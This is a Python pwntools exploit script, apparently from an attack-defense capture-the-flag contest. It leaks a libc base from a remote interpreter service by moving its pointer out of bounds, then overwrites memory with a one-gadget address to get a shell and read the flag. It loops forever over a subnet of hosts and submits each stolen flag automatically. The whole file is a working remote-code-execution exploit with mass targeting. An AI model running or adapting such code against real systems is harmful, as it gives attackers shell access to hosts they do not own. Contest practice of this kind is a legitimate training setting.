from pwn import *
from submit import submit
import time
#context.log_level = 'debug'
def pwn(ip, port):
    one_gadget_offset = 0x43048
    env = {'LD_PRELOAD': './ld.so:./libc.so'}
    #p = process('./pwn24', env=env)
    p = remote(ip, port)
    try:
        p.recvuntil('Put the code: ')
        payload = '<'*0x19
        payload += '.<'*8
        payload += '<'*0x3f
        payload += ',>'*8

        #gdb.attach(p)
        p.sendline(payload)
        libc_base = u64(p.recv(8), endian='big')
        libc_base -= 0x3c71c0
        log.success(hex(libc_base))
        #log.success(hex(len(payload)))

        one_gadget_addr = libc_base + one_gadget_offset
        data = p64(one_gadget_addr)
        p.send(data)
        p.sendline('echo fuck1 && cat flag')
        p.recvuntil('fuck1\n')
        flag = p.recvuntil('\n')[:-1]
    except:
        pass
    p.close()
    return flag
def attack():
    ip_list = []
    black_list = []
    for i in range(10, 60)[::-1]:
        if i not in black_list:
            ip_list.append('172.16.5.' + str(i))
    for ip in ip_list:
        try:
            flag = pwn(ip, 5067)
            log.success('pwn24 {}:{}'.format(ip, flag))
            i = 0
            while True:
                try:
                    result = submit(flag)
                    log.success(result['msg'])
                    log.success(result)
                    if 'Retry' in result['msg']:
                        time.sleep(3)
                        i += 1
                        if i == 3:
                            break
                        continue
                    break
                except:
                    pass
            
        except:
            log.success('{}:{}'.format(ip, 'fuck'))


    
if __name__ == '__main__':
    while True:
        attack()